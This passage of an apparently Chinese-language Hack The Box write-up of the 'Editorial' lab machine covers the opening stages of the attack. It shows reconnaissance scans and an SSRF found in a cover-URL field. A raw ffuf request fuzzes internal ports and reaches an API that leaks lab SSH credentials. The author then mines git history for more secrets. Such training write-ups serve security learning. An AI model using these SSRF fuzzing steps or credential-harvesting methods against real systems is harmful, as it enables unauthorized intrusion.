                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/04/04/box-wp-Haze/" title="【season-7】 htb Haze wp" >
            <div class="recent-link-text">
              【season-7】 htb Haze wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/03/28/Kubernetes-IngressNightmare-1/" title="「IngressNightmareをめざす異世界泥頭車！一、serviceはなに？！」" >
            <div class="recent-link-text">
              「IngressNightmareをめざす異世界泥頭車！一、serviceはなに？！」
            </div>
          </a>
        
          <a class="recent-link" href="/2025/03/25/box-wp-Code/" title="【season-7】 htb Code wp" >
            <div class="recent-link-text">
              【season-7】 htb Code wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/03/19/box-wp-TheFrizz/" title="【season-7】 htb TheFrizz wp" >
            <div class="recent-link-text">
              【season-7】 htb TheFrizz wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/03/13/Tracks-AD-Acute/" title="Tracks-AD-Acute" >
            <div class="recent-link-text">
              Tracks-AD-Acute
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-box-Editorial-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cm95uvrc6002e3gky49pahd5r">
        <img src="/wpimages/2024/Editorial/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        【season-5】box Editorial wp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-06-16T06:23:26.000Z" itemprop="datePublished">2024-06-16</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/htb-Season-5/">htb-Season-5</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            15k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sS 10.129.xxx.xxx -p22,80 -sV --min-rate=3000</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 00:24 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.xx.xx (10.129.xx.xx)</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.35 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2024/Editorial/wp1.jpg" alt="wp1"></p>
<p>扫了一下目录，没啥东西其实。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">└─$ feroxbuster -u http://editorial.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -d 2</span><br><span class="line">                                                                                                                                            </span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.3</span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line"> 🎯  Target Url            │ http://editorial.htb/</span><br><span class="line"> 🚀  Threads               │ 50</span><br><span class="line"> 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt</span><br><span class="line"> 👌  Status Codes          │ All Status Codes!</span><br><span class="line"> 💥  Timeout (secs)        │ 7</span><br><span class="line"> 🦡  User-Agent            │ feroxbuster/2.10.3</span><br><span class="line"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> 🔎  Extract Links         │ <span class="literal">true</span></span><br><span class="line"> 🏁  HTTP methods          │ [GET]</span><br><span class="line"> 🔃  Recursion Depth       │ 2</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line"> 🏁  Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">200      GET      210l      537w     7140c http://editorial.htb/upload</span><br><span class="line">200      GET       72l      232w     2939c http://editorial.htb/about</span><br><span class="line">200      GET        7l     2189w   194901c http://editorial.htb/static/css/bootstrap.min.css</span><br><span class="line">302      GET        5l       22w      201c http://editorial.htb/upload-cover =&gt; http://editorial.htb/upload</span><br><span class="line">200      GET     4780l    27457w  2300540c http://editorial.htb/static/images/pexels-min-an-694740.jpg</span><br><span class="line">200      GET      177l      589w     8577c http://editorial.htb/</span><br><span class="line">200      GET       81l      467w    28535c http://editorial.htb/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</span><br><span class="line">200      GET    10938l    65137w  4902042c http://editorial.htb/static/images/pexels-janko-ferlic-590493.jpg</span><br></pre></td></tr></table></figure>
<p>点了点web功能</p>
<p>其实就这里能用，search也没注入啥的</p>
<p><img src="/wpimages/2024/Editorial/wp2.jpg" alt="wp2"></p>
<p>这里有个框可以填url获取封面，测一下</p>
<p><img src="/wpimages/2024/Editorial/wp3.jpg" alt="wp3"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.129.18.68 - - [16/Jun/2024 02:39:07] <span class="string">&quot;GET /test HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>有收到请求不过返回了个图片地址</p>
<p><img src="/wpimages/2024/Editorial/wp4.jpg" alt="wp4"></p>
<p>正常放了一下请求，发现他这个图裂开了</p>
<p><img src="/wpimages/2024/Editorial/wp5.jpg" alt="wp5"></p>
<p><img src="/wpimages/2024/Editorial/wp7.jpg" alt="wp7"></p>
<p>复制一下看看这图是不是获取到我的test文件了</p>
<p><img src="/wpimages/2024/Editorial/wp6.jpg" alt="wp6"></p>
<p><img src="/wpimages/2024/Editorial/wp8.jpg" alt="wp8"></p>
<p>可以断定应该是一个ssrf，优先考虑目标机器内网端口探测，其次是路径探测，那就需要考虑一下怎么判断探测成不成功了。</p>
<p>比较简单的做法是给个错路径看他回显。</p>
<p><img src="/wpimages/2024/Editorial/wp9.jpg" alt="wp9"></p>
<p>先给个错路径看一下他的应答</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</span><br></pre></td></tr></table></figure>

<p>再换一个没开的端口</p>
<p><img src="/wpimages/2024/Editorial/wp10.jpg" alt="wp10"></p>
<p>可以看到路径返回的也是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</span><br></pre></td></tr></table></figure>

<p>只要目标不存在，返回内容就是固定的。</p>
<p>由此我直接进行一个ffuf。</p>
<p>先存一下包，这里我习惯用ffuf raw request</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> fu</span><br><span class="line">POST /upload-cover HTTP/1.1</span><br><span class="line">Host: editorial.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------41753971281834598872479830583</span><br><span class="line">Content-Length: 358</span><br><span class="line">Origin: http://editorial.htb</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://editorial.htb/upload</span><br><span class="line"></span><br><span class="line">-----------------------------41753971281834598872479830583</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;bookurl&quot;</span></span><br><span class="line"></span><br><span class="line">http://127.0.0.1:FUZZ</span><br><span class="line">-----------------------------41753971281834598872479830583</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;bookfile&quot;</span>; filename=<span class="string">&quot;&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------41753971281834598872479830583--</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后弄个字典</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..65535&#125;;<span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span> &gt;&gt; rl;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>跑一下ffuf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w rl -request-proto http -request fu -fs 61 -t 100</span><br><span class="line"></span><br><span class="line">5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 411ms]</span><br></pre></td></tr></table></figure>

<p>只出了5000</p>
<p>看下5000有啥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;messages&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;promotions&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve a list of all the promotions in our library.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/promos&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;coupons&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve the list of coupons to use in our library.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/coupons&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;new_authors&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve the welcome message sended to our new authors.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/authors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;platform_use&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve examples of how to use the platform.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/messages/how_to_use_platform&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;changelog&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve a list of all the versions and updates of the api.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata/changelog&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;latest&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Retrieve the last version of api.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/latest/metadata&quot;</span>,</span><br><span class="line">        <span class="string">&quot;methods&quot;</span>: <span class="string">&quot;GET&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好吧是一堆接口，看着跟api注册中心似的.</p>
<p>挨个访问了下，有几个访问返回web报错。</p>
<p>其中有回显的是<code>changelog</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;api_route&quot;</span>: <span class="string">&quot;/api/v1/metadata/&quot;</span>,</span><br><span class="line">      <span class="string">&quot;contact_email_1&quot;</span>: <span class="string">&quot;soporte@tiempoarriba.oc&quot;</span>,</span><br><span class="line">      <span class="string">&quot;contact_email_2&quot;</span>: <span class="string">&quot;info@tiempoarriba.oc&quot;</span>,</span><br><span class="line">      <span class="string">&quot;editorial&quot;</span>: <span class="string">&quot;Editorial El Tiempo Por Arriba&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;1.1&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;api_route&quot;</span>: <span class="string">&quot;/api/v1.1/metadata/&quot;</span>,</span><br><span class="line">      <span class="string">&quot;contact_email_1&quot;</span>: <span class="string">&quot;soporte@tiempoarriba.oc&quot;</span>,</span><br><span class="line">      <span class="string">&quot;contact_email_2&quot;</span>: <span class="string">&quot;info@tiempoarriba.oc&quot;</span>,</span><br><span class="line">      <span class="string">&quot;editorial&quot;</span>: <span class="string">&quot;Ed Tiempo Arriba&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;1.2&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;contact_email_1&quot;</span>: <span class="string">&quot;soporte@tiempoarriba.oc&quot;</span>,</span><br><span class="line">      <span class="string">&quot;contact_email_2&quot;</span>: <span class="string">&quot;info@tiempoarriba.oc&quot;</span>,</span><br><span class="line">      <span class="string">&quot;editorial&quot;</span>: <span class="string">&quot;Editorial Tiempo Arriba&quot;</span>,</span><br><span class="line">      <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/v1.2/metadata/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;2&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;contact_email&quot;</span>: <span class="string">&quot;info@tiempoarriba.moc.oc&quot;</span>,</span><br><span class="line">      <span class="string">&quot;editorial&quot;</span>: <span class="string">&quot;Editorial Tiempo Arriba&quot;</span>,</span><br><span class="line">      <span class="string">&quot;endpoint&quot;</span>: <span class="string">&quot;/api/v2/metadata/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>我访问了一下最新的<code>/api/v2/metadata/</code>路径也是报错</p>
<p>然后是<code>author</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;template_mail_message&quot;</span>: <span class="string">&quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.</span></span><br><span class="line"><span class="string">  Your login credentials for our internal forum and authors site are:</span></span><br><span class="line"><span class="string">  Username: dev</span></span><br><span class="line"><span class="string">  Password: dev080217_devAPI!@</span></span><br><span class="line"><span class="string">  Please be sure to change your password as soon as possible for security purposes.</span></span><br><span class="line"><span class="string">  Don&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.</span></span><br><span class="line"><span class="string">  Best regards, Editorial Tiempo Arriba Team.&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给了个账号密码，这里好坑啊我忘了他是个ez靶机，还寻思要拿着这个账户密码过啥认证，端详了好一会。</p>
<p>再是<code>coupons</code>啥都没</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line"><span class="string">&quot;2anniversaryTWOandFOURread4&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;contact_email_2&quot;</span>:</span><br><span class="line"><span class="string">&quot;info@tiempoarriba.oc&quot;</span>,<span class="string">&quot;valid_until&quot;</span>:<span class="string">&quot;12/02/2024&quot;</span></span><br><span class="line">&#125;&#125;,&#123;</span><br><span class="line"><span class="string">&quot;frEsh11bookS230&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;contact_email_2&quot;</span>:</span><br><span class="line"><span class="string">&quot;info@tiempoarriba.oc&quot;</span>,<span class="string">&quot;valid_until&quot;</span>:</span><br><span class="line"><span class="string">&quot;31/11/2023&quot;</span>&#125;&#125;]</span><br></pre></td></tr></table></figure>

<p>然后拿着账户密码去ssh get user了，笑死（</p>
<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>在当前dev用户下面有个apps</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ <span class="built_in">ls</span></span><br><span class="line">apps  user.txt</span><br></pre></td></tr></table></figure>

<p>进去里面有个<code>.git</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ <span class="built_in">ls</span> -al</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .</span><br><span class="line">drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..</span><br><span class="line">drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git</span><br></pre></td></tr></table></figure>

<p>直接进行一个<code>git show</code>瞄一眼，确实是有历史commit</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -&gt; master)</span><br><span class="line">Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;</span><br><span class="line">Date:   Sun Apr 30 21:04:21 2023 -0500</span><br><span class="line"></span><br><span class="line">    fix: bugfix <span class="keyword">in</span> api port endpoint</span><br><span class="line"></span><br><span class="line">diff --git a/app_editorial/app.py b/app_editorial/app.py</span><br><span class="line">index aeabbbc..4855487 100644</span><br><span class="line">--- a/app_editorial/app.py</span><br><span class="line">+++ b/app_editorial/app.py</span><br><span class="line">@@ -22,7 +22,7 @@ def request_reject_localhost(url_bookcover):</span><br><span class="line"> </span><br><span class="line"> <span class="comment"># -- Editorial information (API)</span></span><br><span class="line"> def api_editorial_info(key):</span><br><span class="line">-    r = requests.get(<span class="string">&#x27;http://127.0.0.1:5001/api&#x27;</span>)</span><br><span class="line">+    r = requests.get(<span class="string">&#x27;http://127.0.0.1:5000/api&#x27;</span>)</span><br><span class="line">     json_editorial_info = json.loads(r.text)</span><br><span class="line"> </span><br><span class="line">     editorial_api_version = list(json_editorial_info[<span class="string">&#x27;version&#x27;</span>][-1].keys())[0]</span><br></pre></td></tr></table></figure>

<p>恢复一下文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ git reset --hard 8ad0f3187e2bda88bba85074635ea942974587e8</span><br><span class="line">HEAD is now at 8ad0f31 fix: bugfix <span class="keyword">in</span> api port endpoint</span><br><span class="line">bash-5.1$ <span class="built_in">ls</span></span><br><span class="line">app_api  app_editorial</span><br></pre></td></tr></table></figure>

<p>在app_api下面有个app.py有些难绷</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"><span class="comment"># -- : (development) mail message to new authors</span></span><br><span class="line">@app.route(api_route + <span class="string">&#x27;/authors/message&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def api_mail_new_authors():</span><br><span class="line">    <span class="built_in">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;template_mail_message&#x27;</span>: <span class="string">&quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot;</span> + api_editorial_name + <span class="string">&quot; Team.&quot;</span></span><br><span class="line">    &#125;) <span class="comment"># <span class="doctag">TODO:</span> replace dev credentials when checks pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------</span></span><br><span class="line"><span class="comment"># Start program</span></span><br><span class="line"><span class="comment"># -------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=5000)</span><br><span class="line"></span><br><span class="line">bash-5.1$ <span class="built_in">pwd</span></span><br><span class="line">/home/dev/apps</span><br></pre></td></tr></table></figure>

<p>可以看到他这个其实是5000端口的监听，这个端口下的东西原来是他自己写的…醉了。</p>
<p>需要注意的是这里历史里害有蛮多东西，挨个恢复一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -&gt; master)                                                                            </span><br><span class="line">Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;                                                                      </span><br><span class="line">Date:   Sun Apr 30 21:04:21 2023 -0500             </span><br><span class="line">                                   </span><br><span class="line">    fix: bugfix <span class="keyword">in</span> api port endpoint                                  </span><br><span class="line">                                                                      </span><br><span class="line">commit dfef9f20e57d730b7d71967582035925d57ad883                       </span><br><span 